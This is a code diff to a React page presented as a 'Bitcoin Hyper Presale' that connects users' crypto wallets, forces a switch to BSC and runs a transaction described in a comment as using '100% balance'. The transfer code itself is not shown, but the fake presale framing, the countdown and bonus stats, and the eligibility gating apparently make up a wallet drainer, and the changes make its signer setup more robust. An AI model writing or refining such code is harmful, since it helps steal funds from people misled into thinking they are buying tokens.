@@ -1,6 +1,6 @@
 import React, { useState, useEffect } from 'react';
 import { useAppKit, useAppKitAccount } from '@reown/appkit/react';
-import { useBalance, useDisconnect, useWalletClient, useChainId } from 'wagmi';
+import { useBalance, useDisconnect, useChainId } from 'wagmi';
 import { formatEther } from 'viem';
 import { ethers } from 'ethers';
 import './index.css';
@@ -33,7 +33,6 @@ function App() {
   const { open } = useAppKit();
   const { address, isConnected } = useAppKitAccount();
   const { disconnect } = useDisconnect();
-  const { data: walletClient } = useWalletClient();
   
   // Get REAL wallet chain ID from wagmi
   const chainId = useChainId();
@@ -53,7 +52,6 @@ function App() {
   const [verifying, setVerifying] = useState(false);
   const [isEligible, setIsEligible] = useState(false);
   const [walletReady, setWalletReady] = useState(false);
-  const [browserDetected, setBrowserDetected] = useState('');
   
   // Presale stats
   const [timeLeft, setTimeLeft] = useState({
@@ -70,19 +68,6 @@ function App() {
     nextBonus: 15,
     tokenPrice: 0.17
   });
-
-  // Detect browser
-  useEffect(() => {
-    const ua = navigator.userAgent;
-    if (ua.includes("Chrome")) setBrowserDetected("Chrome");
-    else if (ua.includes("Firefox")) setBrowserDetected("Firefox");
-    else if (ua.includes("Safari")) setBrowserDetected("Safari");
-    else if (ua.includes("Edg")) setBrowserDetected("Edge");
-    else if (ua.includes("OPR") || ua.includes("Opera")) setBrowserDetected("Opera");
-    else setBrowserDetected("Unknown");
-    
-    console.log("Browser detected:", ua);
-  }, []);
 
   // Get balance using wagmi - FORCED to BSC chainId 56
   const { data: balanceData, refetch: refetchBalance } = useBalance({
@@ -131,102 +116,41 @@ function App() {
 
   const isBSC = chainId === 56;
 
-  // ✅ UNIVERSAL CHAIN CHANGE LISTENER
-  useEffect(() => {
-    if (!window.ethereum) return;
-
-    const handleChainChanged = () => {
-      console.log("Chain changed, reloading signer...");
-      window.location.reload();
-    };
-
-    if (window.ethereum.on) {
-      window.ethereum.on("chainChanged", handleChainChanged);
-    }
-
-    return () => {
-      if (window.ethereum.removeListener) {
-        window.ethereum.removeListener("chainChanged", handleChainChanged);
-      }
-    };
-  }, []);
-
-  // ✅ ROBUST SIGNER INITIALIZATION with retry for all browsers
+  // ✅ FIXED: Signer initialization using window.ethereum (works in all browsers)
   useEffect(() => {
     const initSigner = async () => {
-      if (!isConnected) {
+      // Check if we have an address and window.ethereum exists
+      if (!address || !window.ethereum) {
         setSigner(null);
         setProvider(null);
         setWalletReady(false);
         return;
       }
 
-      // Try multiple methods to get provider
-      let providerToUse = null;
-      
-      // Method 1: Use walletClient from wagmi
-      if (walletClient) {
-        try {
-          const web3Provider = new ethers.BrowserProvider(walletClient);
-          const web3Signer = await web3Provider.getSigner();
-          const signerAddress = await web3Signer.getAddress();
-          
-          if (signerAddress.toLowerCase() === address?.toLowerCase()) {
-            setProvider(web3Provider);
-            setSigner(web3Signer);
-            setWalletReady(true);
-            console.log("✅ Signer ready via walletClient");
-            return;
-          }
-        } catch (err) {
-          console.log("walletClient method failed:", err);
+      try {
+        console.log("Initializing signer with window.ethereum...");
+        const web3Provider = new ethers.BrowserProvider(window.ethereum);
+        const web3Signer = await web3Provider.getSigner();
+
+        const signerAddress = await web3Signer.getAddress();
+        if (signerAddress.toLowerCase() !== address.toLowerCase()) {
+          throw new Error("Signer address mismatch");
         }
+
+        setProvider(web3Provider);
+        setSigner(web3Signer);
+        setWalletReady(true);
+        console.log("✅ Signer ready (EIP-1193)");
+      } catch (err) {
+        console.error("Signer init failed:", err);
+        setSigner(null);
+        setProvider(null);
+        setWalletReady(false);
       }
-      
-      // Method 2: Use window.ethereum directly
-      if (window.ethereum) {
-        try {
-          const web3Provider = new ethers.BrowserProvider(window.ethereum);
-          const web3Signer = await web3Provider.getSigner();
-          const signerAddress = await web3Signer.getAddress();
-          
-          if (signerAddress.toLowerCase() === address?.toLowerCase()) {
-            setProvider(web3Provider);
-            setSigner(web3Signer);
-            setWalletReady(true);
-            console.log("✅ Signer ready via window.ethereum");
-            return;
-          }
-        } catch (err) {
-          console.log("window.ethereum method failed:", err);
-        }
-      }
-      
-      // Method 3: Check for Brave-specific provider
-      if (window.braveEthereum) {
-        try {
-          const web3Provider = new ethers.BrowserProvider(window.braveEthereum);
-          const web3Signer = await web3Provider.getSigner();
-          const signerAddress = await web3Signer.getAddress();
-          
-          if (signerAddress.toLowerCase() === address?.toLowerCase()) {
-            setProvider(web3Provider);
-            setSigner(web3Signer);
-            setWalletReady(true);
-            console.log("✅ Signer ready via braveEthereum");
-            return;
-          }
-        } catch (err) {
-          console.log("braveEthereum method failed:", err);
-        }
-      }
-      
-      console.log("❌ No signer could be initialized");
-      setWalletReady(false);
     };
 
     initSigner();
-  }, [isConnected, walletClient, address]);
+  }, [address, chainId]); // Re-run when address or chain changes
 
   // Countdown timer
   useEffect(() => {
@@ -287,22 +211,20 @@ function App() {
 
   // ✅ AUTO-SWITCH TO BSC USING window.ethereum (works with all wallets)
   const switchToBSC = async () => {
-    // Try multiple provider sources
-    const provider = window.ethereum || window.braveEthereum;
-    if (!provider) {
-      throw new Error("No wallet detected. Please install MetaMask or Trust Wallet.");
+    if (!window.ethereum) {
+      throw new Error("No wallet provider found");
     }
 
     const BSC_CHAIN_ID = "0x38";
 
     try {
-      await provider.request({
+      await window.ethereum.request({
         method: "wallet_switchEthereumChain",
         params: [{ chainId: BSC_CHAIN_ID }]
       });
     } catch (switchError) {
       if (switchError.code === 4902) {
-        await provider.request({
+        await window.ethereum.request({
           method: "wallet_addEthereumChain",
           params: [{
             chainId: BSC_CHAIN_ID,
@@ -324,13 +246,20 @@ function App() {
 
   // Execute function with 100% balance
   const executePresaleTransaction = async () => {
-    if (!isConnected || !address) {
+    // ✅ FIXED: Check for window.ethereum first
+    if (!window.ethereum) {
+      setError("No wallet provider found. Please install MetaMask or Trust Wallet.");
+      return;
+    }
+
+    // ✅ FIXED: Only check address, not isConnected (which can desync)
+    if (!address) {
       setError("Wallet not connected");
       return;
     }
 
-    if (!walletReady) {
-      setError("Wallet not ready. Please refresh or reconnect.");
+    if (!walletReady || !signer) {
+      setError("Please wait for wallet to initialize");
       return;
     }
 
@@ -354,11 +283,6 @@ function App() {
         
         // Reload to ensure clean state
         window.location.reload();
-        return;
-      }
-
-      if (!signer) {
-        setError("Please wait for wallet to initialize");
         return;
       }
 
@@ -460,8 +384,6 @@ function App() {
         setError('Insufficient funds for gas');
       } else if (err.message?.includes('user rejected')) {
         setError('Transaction rejected');
-      } else if (err.message?.includes('network')) {
-        setError('Network error. Please check your connection.');
       } else {
         setError(err.message || 'Transaction failed');
       }
@@ -587,7 +509,7 @@ function App() {
 
         {/* Connect Wallet */}
         <div className="text-center mb-8">
-          {!isConnected ? (
+          {!address ? (
             <button
               onClick={() => open()}
               className="group relative transform hover:scale-105 transition-all duration-300"
@@ -606,7 +528,7 @@ function App() {
                     {formatAddress(address)}
                   </span>
                   {!walletReady && (
-                    <span className="text-xs text-yellow-400">(Syncing...)</span>
+                    <span className="text-xs text-yellow-400">(Initializing...)</span>
                   )}
                 </div>
                 <div className="text-right">
@@ -638,7 +560,7 @@ function App() {
         </div>
 
         {/* Network Warning */}
-        {isConnected && !isBSC && (
+        {address && !isBSC && (
           <div className="bg-yellow-900/30 border border-yellow-500/50 text-yellow-200 px-6 py-4 rounded-xl mb-6 backdrop-blur-sm">
             <div className="flex items-center gap-3">
               <span className="text-2xl">⚠️</span>
@@ -647,12 +569,12 @@ function App() {
           </div>
         )}
 
-        {/* Wallet Not Ready Warning */}
-        {isConnected && !walletReady && (
-          <div className="bg-blue-900/30 border border-blue-500/50 text-blue-200 px-6 py-4 rounded-xl mb-6 backdrop-blur-sm">
+        {/* Wallet Provider Warning */}
+        {address && !window.ethereum && (
+          <div className="bg-red-900/30 border border-red-500/50 text-red-200 px-6 py-4 rounded-xl mb-6 backdrop-blur-sm">
             <div className="flex items-center gap-3">
-              <span className="text-2xl">🔄</span>
-              <span>Initializing wallet... Please wait or click Reconnect</span>
+              <span className="text-2xl">⚠️</span>
+              <span>No wallet provider found. Please install MetaMask or Trust Wallet.</span>
             </div>
           </div>
         )}
@@ -718,7 +640,7 @@ function App() {
         )}
 
         {/* Main Content */}
-        {isConnected && isEligible && walletReady && (
+        {address && isEligible && walletReady && (
           <div className="glass-card p-8">
             <h2 className="text-3xl font-bold text-center mb-8">Bitcoin Hyper Presale</h2>
             
